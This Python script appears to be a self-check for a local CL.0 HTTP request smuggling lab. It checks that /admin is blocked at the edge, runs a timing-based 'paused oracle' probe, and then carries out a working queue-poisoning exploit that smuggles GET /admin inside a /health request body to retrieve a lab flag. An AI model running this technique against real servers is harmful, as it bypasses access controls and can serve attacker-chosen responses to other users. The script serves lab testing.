"""Self-check for the CL.0 request smuggling lab.

Proves, through the edge:
  1. direct /admin is 403 at the edge;
  2. the PAUSED ORACLE differential: a CL.0 endpoint (/health) answers early
     without a body, while a normal endpoint (/submit) waits for the promised body;
  3. the CL.0 queue-poison exploit: a GET /admin smuggled inside a /health carrier
     body reaches the backend and its response is served to a follow-up request.

  python3 tests/verify_cl0.py [host] [port]      # default 127.0.0.1 9094
"""
import re
import socket
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9094


def send_full(payload, read_timeout=8):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(read_timeout)
    s.connect((HOST, PORT))
    s.sendall(payload)
    data = b""
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            data += c
    except socket.timeout:
        pass
    s.close()
    return data


def paused_probe(path, promised=20, wait=6.0):
    """Send headers with a Content-Length promising `promised` bytes, then withhold
    the body. Return (early_status_or_None, elapsed)."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(wait)
    s.connect((HOST, PORT))
    head = (f"POST {path} HTTP/1.1\r\nHost: x\r\nContent-Length: {promised}\r\n"
            f"Connection: close\r\n\r\n").encode()
    s.sendall(head)
    t0 = time.time()
    early = None
    try:
        data = s.recv(4096)
        if data:
            early = data.split(b"\r\n", 1)[0].decode("latin-1", "replace")
    except socket.timeout:
        early = None
    elapsed = time.time() - t0
    s.close()
    return early, elapsed


def first_line(resp):
    return resp.split(b"\r\n", 1)[0].decode("latin-1", "replace") if resp else "(none)"


def main():
    # 1. control
    control = send_full(b"GET /admin HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
    assert b"403" in control, f"expected 403 at edge for /admin, got {first_line(control)}"
    print("1. direct /admin at edge:", first_line(control))

    # 2. paused oracle differential
    early_h, t_h = paused_probe("/health")
    early_s, t_s = paused_probe("/submit")
    print(f"2. paused /health -> early={early_h!r} ({t_h:.2f}s); "
          f"paused /submit -> early={early_s!r} ({t_s:.2f}s)")
    assert early_h and "200" in early_h, "CL.0 endpoint /health did NOT answer early (oracle failed)"
    assert not early_s, "normal /submit answered without a body (no differential)"

    # 3. CL.0 queue-poison exploit: smuggle GET /admin inside a /health carrier body
    smuggled = b"GET /admin HTTP/1.1\r\nHost: x\r\n\r\n"
    carrier = (b"POST /health HTTP/1.1\r\nHost: x\r\n"
               + f"Content-Length: {len(smuggled)}\r\n".encode()
               + b"Connection: keep-alive\r\n\r\n" + smuggled)
    send_full(carrier, read_timeout=4)
    time.sleep(0.3)
    follow = send_full(b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
    m = re.search(rb"REDAMON_HRS\{[^}]*\}", follow)
    assert m, f"CL.0 smuggle did not return the flag; follow-up was {first_line(follow)}"
    print("3. CL.0 smuggle -> follow-up got:", first_line(follow), "flag:", m.group(0).decode())
    print("OK: CL.0 desync confirmed via paused oracle + queue poisoning.")


if __name__ == "__main__":
    main()
